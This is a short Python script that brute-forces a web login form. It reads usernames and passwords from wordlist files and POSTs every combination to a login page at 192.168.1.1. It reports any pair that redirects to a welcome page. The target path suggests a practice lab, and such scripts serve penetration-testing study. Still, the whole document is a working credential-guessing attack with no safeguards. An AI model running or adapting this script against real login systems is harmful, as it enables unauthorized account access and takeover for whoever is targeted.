import http.client, urllib.parse

# Used wordlist for usernames & passwords
username_file = open('users_list.txt')
password_file = open('passwords_list.txt')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

# Removing the new lines form the file and looping over them
for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()


        print (user,"-",pwd)
        
        # Trying all the usernames and passwords then establishing a connection to the target IP
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        conn = http.client.HTTPConnection("192.168.1.1",80) # Target IP Address & Port
        conn.request("POST", "/bruteforce_login/verify_login.php", post_parameters, headers)
        response = conn.getresponse()

        # In case of moving on to the next page, print the successful username & password
        if(response.getheader('location') == "welcome.php"):
            print("Logged with:",user," - ",pwd)

